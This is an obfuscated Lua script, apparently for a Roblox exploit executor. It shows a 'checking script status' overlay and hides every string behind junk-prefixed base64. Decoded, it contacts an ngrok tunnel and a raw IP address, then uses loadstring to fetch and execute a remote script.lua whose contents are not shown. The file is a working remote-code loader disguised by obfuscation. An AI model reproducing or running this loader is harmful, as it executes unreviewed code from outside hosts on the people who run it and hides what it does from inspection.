local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function urVCkdhdbaML(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local function checkSiteStatus(url)
    local success, result = pcall(function()
        return game:HttpGet(url .. urVCkdhdbaML('kLGzJknLVzyjNtRZtfkzmcrvpxvVfLaCKyiMTYatuKrSJlltWhlmNteL3N0YXR1cy50eHQ='))
    end)

    if success then
        return true
    else
        return false
    end
end

local Welcome = Instance.new(urVCkdhdbaML('zxDuPKPxzLpYViwvXZScRLRxjlPxOGxHvkUExOGzKErASvuwPElgqPrU2NyZWVuR3Vp'))
local ScriptStatus = Instance.new(urVCkdhdbaML('LADNrDhwYppqkulEymwyvjQqadhiFocfVJdTkhmanYvctDHSKAaVMYwRnJhbWU='))
local UICorner = Instance.new(urVCkdhdbaML('aTbFnSCfNURDksvqpOWKvzQCUtMSuQQReVxMacWTieobjhguFilPglhVUlDb3JuZXI='))
local status = Instance.new(urVCkdhdbaML('xMnGjiWuTtEHfPFzbblxdtCGlghFxqWLuuaLTHpPLVzAJiwyIRYuQyiVGV4dExhYmVs'))

Welcome.Name = urVCkdhdbaML('LkMASFwiUvmlgXbrlsHIgZtiMFxWETSTZOXvGLThQsxvJpfeGdlGxYRV2VsY29tZQ==')
Welcome.Parent = game.CoreGui

ScriptStatus.Name = urVCkdhdbaML('axewuDoxfrZguubwRneuRyqafMBGvBCAWPMcgYHeqhSnfMzBJAAQMtjU2NyaXB0U3RhdHVz')
ScriptStatus.Parent = Welcome
ScriptStatus.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
ScriptStatus.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScriptStatus.BorderSizePixel = 0
ScriptStatus.Position = UDim2.new(0.293931752, 0, 0.241623715, 0)
ScriptStatus.Size = UDim2.new(0, 165, 0, 61)

UICorner.Parent = ScriptStatus

status.Name = urVCkdhdbaML('daJHVUZeOhRUbAjwdfFcwxqRQCgRMhVWTcMomLcnajKEtJhdgwAqkiDc3RhdHVz')
status.Parent = ScriptStatus
status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
status.BackgroundTransparency = 1.000
status.BorderColor3 = Color3.fromRGB(0, 0, 0)
status.BorderSizePixel = 0
status.Size = UDim2.new(0, 165, 0, 61)
status.Font = Enum.Font.SourceSansBold
status.Text = urVCkdhdbaML('cAZZFBfoBljIPqyqdMgQmpiVjBiioksTDgdIuCDXVcjLNrMmRCUfyYMQ2hlY2tpbmcgc2NyaXB0IHN0YXR1cy4uLg==')
status.TextColor3 = Color3.fromRGB(255, 255, 255)
status.TextScaled = true
status.TextSize = 14.000
status.TextWrapped = true

if checkSiteStatus(urVCkdhdbaML('lsibbSgjqWVIOwxfucVeykSKhgXJJZXpylCjKbREXkEwHXXEnrifSpXaHR0cDovL2V4b3RpYy1ob3BlbGVzc2x5LW1pbmsubmdyb2stZnJlZS5hcHA=')) == true then
status.Text = urVCkdhdbaML('gqscOqHjTucbHjsWeAYMwfoYhuGqCsYmmgdVFWNeuuTWucIJBvPjHnRU2NyaXB0IGlzIE9O4pyF')
task.wait(2)
Welcome:Destroy()
getgenv().address = urVCkdhdbaML('wLiwAvQtthvMuwQOGrHIIJOnvWsqnWvzvwfuNtlBsceDHqzDqtDrRAMZXhvdGljLWhvcGVsZXNzbHktbWluay5uZ3Jvay1mcmVlLmFwcC9TaGFkb3ctU2NyaXB0cw==')
loadstring(game:HttpGet(urVCkdhdbaML('aVOdIBXxQgfONHtGAFlhOUZwEctNgBOyxdCFKxEBqbKqEeeXtrGpfcQaHR0cDovL2V4b3RpYy1ob3BlbGVzc2x5LW1pbmsubmdyb2stZnJlZS5hcHAvU2hhZG93LVNjcmlwdHMvc2NyaXB0Lmx1YQ==')))()
end
if checkSiteStatus(urVCkdhdbaML('srwIZbVWmGkAldydBgSZpNpgqgNMvscbWyXzLdeRAuWGnCAqsGHnxrvaHR0cDovLzE4OC45MC4yMzAuMTg5OjUwMDQ=')) == true then
status.Text = urVCkdhdbaML('bgYOCxuFjpMQNgjUQPjohLjUSoWVpEwvITXZQTOTdiTJmGouALwtVeLU2NyaXB0IGlzIE9O4pyF')
task.wait(2)
Welcome:Destroy()
getgenv().address = urVCkdhdbaML('UOPoEfCeFAtpHeRyGNfKckvSVCEKDVkKSxaYgtBSzUzXmVUpKNuqTilMTg4LjkwLjIzMC4xODk6NTAwNC9TaGFkb3ctU2NyaXB0cw==')
loadstring(game:HttpGet(urVCkdhdbaML('kQxIZVgUCypvUaFLJIEyanongChNzbvPgfDnjZcraUzgQVwyXTIdQoRaHR0cDovLzE4OC45MC4yMzAuMTg5OjUwMDQvU2hhZG93LVNjcmlwdHMvc2NyaXB0Lmx1YQ==')))()
end
if checkSiteStatus(urVCkdhdbaML('YSzbuglCcUBBcTrmTkiQFoVoTyyCNLEClqkxvMPDMyEYtyXtVLueNyPaHR0cDovL2V4b3RpYy1ob3BlbGVzc2x5LW1pbmsubmdyb2stZnJlZS5hcHA=')) == false and checkSiteStatus(urVCkdhdbaML('FZMCIzidrAUaIWiOnMYWnLHpjlGPmVzZcgfQhNnznXkqLfqDhektuPtaHR0cDovLzE4OC45MC4yMzAuMTg5OjUwMDQ=')) == false then
status.Text = urVCkdhdbaML('FGPiasdlIvohbfPcjMSVqkNlhWJrkrnEywMfwbLCKomyGyZRbJWsaMyU2NyaXB0IGlzIE9GRuKdjA==')
task.wait(2)
Welcome:Destroy()
end    
